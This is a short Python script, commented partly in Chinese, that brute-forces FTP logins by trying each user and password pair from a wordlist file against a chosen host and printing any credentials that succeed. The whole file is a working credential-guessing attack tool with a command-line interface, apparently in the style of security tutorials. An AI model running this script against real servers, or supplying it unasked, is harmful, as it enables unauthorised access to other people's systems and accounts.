# coding=UTF-8
import ftplib
import optparse

def bruteLogin(hostname, passwdFile):
	pF = open(passwdFile, 'r')    
	for line in pF:        
		userName = line.split(' ')[0]        
		passWord = line.split(' ')[1].strip('\r').strip('\n')        
		print("[+] Trying: " + userName + " " + passWord)        
		try:            
			ftp = ftplib.FTP(hostname)            
			ftp.login(userName, passWord)            
			print('\n[*] ' + str(hostname) + ' FTP Logon Succeeded: ' + userName + " " + passWord)            
			ftp.quit()            
			return (userName, passWord)        
		except Exception as e:            
			pass    
	print('\n[-] Could not brute force FTP credentials.')    
	return (None, None)

#主函数
def main():
	parser = optparse.OptionParser('usage%prog '+'-H <host> -f <password list>')    
	parser.add_option('-H', dest='host', type='string', help='specify host')
	parser.add_option('-f', dest='passwdFile', type='string', help='specify password file')#设置密码字典文件
	(options, args) = parser.parse_args()    
	host 		= options.host
	passwdFile 	= options.passwdFile  
	if host == None or passwdFile == None:
		print(parser.usage)
		exit(0)
	bruteLogin(host, passwdFile)

if __name__ == '__main__':
	main()